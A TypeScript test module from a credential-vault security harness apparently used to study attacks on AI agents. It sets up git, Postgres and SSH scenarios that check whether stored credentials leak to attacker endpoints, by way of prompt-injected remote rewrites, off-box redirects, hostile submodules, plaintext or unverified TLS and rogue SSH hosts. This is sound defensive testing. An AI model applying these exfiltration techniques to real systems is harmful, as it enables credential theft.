import { existsSync, mkdtempSync, rmSync } from "node:fs";
import { join } from "node:path";
import { tmpdir } from "node:os";
import { storeSecret } from "../harness/vault.js";
import { caPem } from "../harness/pki.js";
import { clientKeyPem, knownHostPin } from "../harness/ssh.js";
import { resolveGit } from "../harness/fixtures.js";
import { PG, SSHD_PINNED, SSHD_ROGUE } from "../harness/backends.js";
import { resetSink, sinkRequests, sinkSawCredential } from "../harness/attacker.js";
import {
  DB_CREDENTIAL,
  DB_IP_LITERAL_PAYLOAD,
  DB_PLAINTEXT_PAYLOAD,
  DB_QUERY,
  GIT_HTTP_CREDENTIAL,
  SSH_PINNED_PAYLOAD,
  SSH_ROGUE_PAYLOAD,
  gitRedirectPayload,
  gitSubmodulePayload,
} from "../harness/payloads.js";
import { Outcome } from "./scenario.js";
import type { OutcomeValue, ScenarioArm, ScenarioSetup } from "./scenario.js";
import type { Arm, CallOutcome } from "../arms/arm.js";
import type { HarnessVault } from "../harness/vault.js";
import { redactForDiagnostics } from "../assert/opacity.js";

const NONCE = "p4b";
const HOST_REFUSAL = "Host not in secret allowlist";

/** Clone destinations, wiped once the scenario's arms are done with them. */
const CLONE_DIRS: string[] = [];

function freshCloneDir(): string {
  const dir = mkdtempSync(join(tmpdir(), "harpoc-p4b-clone-"));
  CLONE_DIRS.push(dir);
  return dir;
}

function wipeCloneDirs(): void {
  while (CLONE_DIRS.length > 0) {
    rmSync(CLONE_DIRS.pop() as string, { recursive: true, force: true });
  }
}

function parsed(outcome: CallOutcome): Record<string, unknown> {
  try {
    return JSON.parse(outcome.text) as Record<string, unknown>;
  } catch {
    return {};
  }
}

/**
 * The verdict for a paired target-control arm, as one rule applied to both
 * sides — the same construction `classifyExfiltration` uses for the HTTP arms,
 * extended with the refusal REASON.
 *
 * Requiring the reason is what the Phase 2 review's evidence-integrity findings
 * bought: any pre-connection failure produces `ok === false`, so a bare
 * "refused" would let a broken fixture, a missing binary or an unrelated schema
 * error satisfy an arm that claims to certify target allowlisting.
 *
 * Exported ONLY for its redaction wiring pin (`targeted.test.ts`, F10 fix
 * round 1): the throw branches below are the sole call site of
 * `redactForDiagnostics` in this module, and a green fleet run never executes
 * them — they fire exactly when a fixture is broken. Without a direct test a
 * site that forgot to redact would ship with no falsifiable pin, ever. Do not
 * "tidy" this export away without replacing what it covers.
 */
export function targetedVerdict(
  arm: Arm,
  reached: boolean,
  outcome: CallOutcome,
  credential: string,
): OutcomeValue {
  if (arm.name === "baseline") {
    if (!reached) {
      throw new Error(
        "baseline did not reach the attacker target: the attack path is broken, so the " +
          `paired row would compare nothing (ok=${String(outcome.ok)}, ` +
          `text=${redactForDiagnostics(outcome.text.slice(0, 300), credential)})`,
      );
    }
    return Outcome.EXFILTRATED;
  }
  // A divergence to report, not an expectation to edit.
  if (reached) return Outcome.EXFILTRATED;
  if (!outcome.ok && (outcome.errorText ?? "").includes(HOST_REFUSAL)) return Outcome.BLOCKED;
  throw new Error(
    "arm is not discriminating: the target was not reached, but the refusal does not name " +
      `the host allowlist — ok=${String(outcome.ok)}, error=` +
      redactForDiagnostics(outcome.errorText ?? "(none)", credential),
  );
}

/**
 * §6.2.2's non-HTTP analogues — target control where the HTTP path's evidence
 * does not transfer.
 *
 * The 2026-07-25 review is the reason these are run rather than argued: every
 * per-context enforcement defect it found (C1, H1, H6, M3) was unreachable
 * through the deep-tested HTTP and process paths. Each arm here is one of those
 * paths, driven end to end against a live backend.
 */
export const TARGETED_ARMS: ScenarioArm[] = [
  {
    scenario: "url-manipulation",
    context: "git",
    variant: "git-ssh-remote-rewrite",
    services: ["sshd-pinned", "sshd-rogue"],
    async setup(vault) {
      const credential = clientKeyPem();
      const handle = await storeSecret(vault, `p4b-git-ssh-${NONCE}`, credential);
      // Only the legitimate server is allowlisted, and only its key is pinned.
      await vault.engine.setInjectionPolicy(handle, {
        url_allowlist: [],
        command_allowlist: [resolveGit()],
        env_allowlist: ["GIT_CONFIG_NOSYSTEM", "GIT_CONFIG_GLOBAL"],
        host_allowlist: [SSHD_PINNED.host],
      });
      await vault.engine.setConnectionConfig(handle, {
        ssh: { known_hosts: [knownHostPin(SSHD_PINNED.host, "pinned")] },
      });
      return { handle, credential, marker: `p4b-git-ssh-marker-${NONCE}`, cleanup: wipeCloneDirs };
    },
    async observe(arm, setup) {
      // The remote a prompt injection rewrites: same operation, same key,
      // different host. The rogue server authorizes the same public key and
      // serves the same repository, so nothing but the allowlist stands between
      // the credential and an attacker-controlled endpoint.
      const dest = freshCloneDir();
      const outcome = await arm.invoke(setup.handle, {
        type: "git",
        operation: "clone",
        repository: `ssh://${SSHD_ROGUE.user}@${SSHD_ROGUE.host}${SSHD_ROGUE.repoPath}`,
        working_directory: dest,
      });
      // Reached = the key authenticated to the attacker host and data came
      // back. A working tree is unambiguous; an exit code alone would not
      // distinguish "refused" from "authenticated, then failed for some other
      // reason".
      return targetedVerdict(arm, existsSync(join(dest, "README.md")), outcome, setup.credential);
    },
  },
  {
    scenario: "url-manipulation",
    context: "database",
    variant: "database-attacker-host",
    services: ["postgres-tls", "postgres-plain"],
    async setup(vault) {
      const handle = await storeSecret(vault, `p4b-db-host-${NONCE}`, DB_CREDENTIAL);
      // The legitimate server, by name and port, with its CA pinned.
      await vault.engine.setInjectionPolicy(handle, {
        url_allowlist: [],
        command_allowlist: [],
        env_allowlist: [],
        host_allowlist: [`${PG.host}:${String(PG.port)}`],
      });
      await vault.engine.setConnectionConfig(handle, {
        database: { tls_mode: "require", ca_pem: caPem() },
      });
      return { handle, credential: DB_CREDENTIAL, marker: `p4b-db-marker-${NONCE}` };
    },
    async observe(arm, setup) {
      // The query redirected to an attacker host:port (D4 — postgres-plain
      // stands in as the attacker database, which is also what a rogue endpoint
      // looks like: no TLS on offer). The credential authenticates there if
      // anything lets it.
      const outcome = await arm.invoke(setup.handle, {
        type: "database",
        engine: "postgresql",
        host: `${PG.host}:${String(PG.plainPort)}`,
        database: PG.database,
        query: DB_QUERY,
      });
      const reached = parsed(outcome)["row_count"] === 1;
      return targetedVerdict(arm, reached, outcome, setup.credential);
    },
  },
];

/**
 * The baseline halves of the Phase 1–2 targeted refusals.
 *
 * Each of these Harpoc rows already exists — emitted by the context suite that
 * introduced the arm — and each was a lone block: evidence that Harpoc refuses,
 * with nothing beside it showing what the status quo does. These arms supply
 * the missing side, running the SAME payload (imported, not retyped) against
 * the §2.3 baseline, which is what turns each into the controlled comparison
 * C-3 asks for.
 *
 * They declare `arms: ["baseline"]` because the Harpoc side is not this suite's
 * to emit: re-running it would write a second record under a key that already
 * has one.
 *
 * Two outcome vocabularies, chosen per arm by what the status quo actually
 * does, never rounded up:
 *
 *   EXFILTRATED  the credential authenticated to, or was handed to, an
 *                ATTACKER-controlled endpoint (the redirect target, the hostile
 *                submodule's host, the rogue ssh server).
 *   SUCCEEDED    the operation completed against a legitimate endpoint the
 *                vault refuses on transport or policy grounds — an unverified
 *                certificate identity, a plaintext connection, a host outside
 *                the allowlist. Calling those "exfiltrated" would overstate
 *                them: nothing hostile received anything. What they show is
 *                that the status quo does not stop the operation at all.
 */
async function counterpartSetup(
  vault: HarnessVault,
  name: string,
  credential: string,
): Promise<ScenarioSetup> {
  // A vault secret is created even though only the baseline runs: the setup
  // shape stays uniform, and `arms` remains a statement about which sides run
  // rather than a second, quieter code path.
  const handle = await storeSecret(vault, `p4b-${name}-${NONCE}`, credential);
  return { handle, credential, marker: `p4b-${name}-marker-${NONCE}` };
}

/**
 * A baseline counterpart's verdict: the operation must genuinely have happened.
 *
 * Exported ONLY for its redaction wiring pin (`targeted.test.ts`, F10 fix
 * round 1) — same reason as `targetedVerdict` above: the throw branch is
 * unreachable from a passing fleet run, so a direct call is the only way to
 * falsify that this site still redacts. Do not "tidy" this export away
 * without replacing what it covers.
 */
export function counterpartVerdict(
  reached: boolean,
  observed: OutcomeValue,
  outcome: CallOutcome,
  credential: string,
): OutcomeValue {
  if (!reached) {
    throw new Error(
      "baseline counterpart did not complete the operation Harpoc refuses, so the paired row " +
        `would compare nothing (ok=${String(outcome.ok)}, text=` +
        `${redactForDiagnostics(outcome.text.slice(0, 300), credential)})`,
    );
  }
  return observed;
}

export const BASELINE_COUNTERPART_ARMS: ScenarioArm[] = [
  {
    scenario: "git-http-redirect-refused",
    context: "git",
    arms: ["baseline"],
    services: ["git-http", "attacker"],
    setup: (vault) => counterpartSetup(vault, "h6a", GIT_HTTP_CREDENTIAL),
    async observe(arm, setup) {
      await resetSink();
      const outcome = await arm.invoke(setup.handle, gitRedirectPayload(freshCloneDir()));
      // The status quo follows the 302 off-box, is challenged by the attacker,
      // and a host-blind credential helper answers. The sink is the evidence:
      // read out of band, it says what actually left the machine.
      const arrived = await sinkRequests();
      return counterpartVerdict(
        sinkSawCredential(setup.credential, arrived),
        Outcome.EXFILTRATED,
        outcome,
        setup.credential,
      );
    },
  },
  {
    scenario: "git-http-submodule-denied",
    context: "git",
    arms: ["baseline"],
    services: ["git-http", "attacker"],
    setup: (vault) => counterpartSetup(vault, "h6b", GIT_HTTP_CREDENTIAL),
    async observe(arm, setup) {
      await resetSink();
      const outcome = await arm.invoke(setup.handle, gitSubmodulePayload(freshCloneDir()));
      // The second target is chosen by the REPOSITORY, not by the caller: the
      // .gitmodules committed into the fixture names the attacker. Recursion
      // fetches it and the same host-blind helper authenticates.
      const arrived = await sinkRequests();
      return counterpartVerdict(
        sinkSawCredential(setup.credential, arrived),
        Outcome.EXFILTRATED,
        outcome,
        setup.credential,
      );
    },
  },
  {
    scenario: "database-ip-literal-identity",
    context: "database",
    arms: ["baseline"],
    services: ["postgres-tls"],
    setup: (vault) => counterpartSetup(vault, "m3", DB_CREDENTIAL),
    async observe(arm, setup) {
      const outcome = await arm.invoke(setup.handle, DB_IP_LITERAL_PAYLOAD);
      // TLS up, identity unverified — the exact posture M3 found in the vault
      // and fixed. The status quo connects and answers the query.
      return counterpartVerdict(
        parsed(outcome)["row_count"] === 1,
        Outcome.SUCCEEDED,
        outcome,
        setup.credential,
      );
    },
  },
  {
    scenario: "database-plaintext-target",
    context: "database",
    arms: ["baseline"],
    services: ["postgres-plain"],
    setup: (vault) => counterpartSetup(vault, "plain", DB_CREDENTIAL),
    async observe(arm, setup) {
      const outcome = await arm.invoke(setup.handle, DB_PLAINTEXT_PAYLOAD);
      // No TLS on offer at all: the status quo sends the credential in the
      // clear rather than refusing.
      return counterpartVerdict(
        parsed(outcome)["row_count"] === 1,
        Outcome.SUCCEEDED,
        outcome,
        setup.credential,
      );
    },
  },
  {
    scenario: "ssh-host-key-mismatch",
    context: "ssh",
    arms: ["baseline"],
    services: ["sshd-rogue"],
    setup: (vault) => counterpartSetup(vault, "rogue", clientKeyPem()),
    async observe(arm, setup) {
      const outcome = await arm.invoke(setup.handle, SSH_ROGUE_PAYLOAD);
      const r = parsed(outcome);
      // StrictHostKeyChecking=no accepts whatever answers, so the key
      // authenticates to the rogue server and the remote command runs there.
      const reached = r["exit_code"] === 0 && String(r["stdout"] ?? "").includes(SSHD_ROGUE.user);
      return counterpartVerdict(reached, Outcome.EXFILTRATED, outcome, setup.credential);
    },
  },
  {
    scenario: "ssh-host-not-allowed",
    context: "ssh",
    arms: ["baseline"],
    services: ["sshd-pinned"],
    setup: (vault) => counterpartSetup(vault, "unlisted", clientKeyPem()),
    async observe(arm, setup) {
      const outcome = await arm.invoke(setup.handle, SSH_PINNED_PAYLOAD);
      const r = parsed(outcome);
      // There is no allowlist to consult: the status quo connects wherever the
      // call names.
      const reached = r["exit_code"] === 0 && String(r["stdout"] ?? "").includes(SSHD_PINNED.user);
      return counterpartVerdict(reached, Outcome.SUCCEEDED, outcome, setup.credential);
    },
  },
];
